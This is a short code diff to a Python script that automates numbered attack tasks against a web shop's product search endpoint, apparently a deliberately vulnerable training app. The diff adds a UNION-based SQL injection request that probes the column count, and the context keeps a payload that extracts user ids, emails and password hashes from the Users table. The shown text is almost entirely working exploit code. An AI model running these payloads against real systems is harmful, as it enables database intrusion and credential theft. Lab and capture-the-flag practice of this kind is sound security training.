@@ -127,6 +127,11 @@ def main():
         
     # Task 10: UNION SQL Injection Search & Save sqli.txt
     print("\n--- Running Task 10: UNION SQL Injection Search ---")
+    warmup_query = "qwert')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/*"
+    warmup_url = "{}/rest/products/search?q={}".format(base_url, urllib.parse.quote(warmup_query))
+    warmup_status, _ = make_request(warmup_url, "GET")
+    print("UNION SQLi column-count warmup status: {}".format(warmup_status))
+
     sqli_query = "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users/*"
     escaped_query = urllib.parse.quote(sqli_query)
     status, res = 500, None
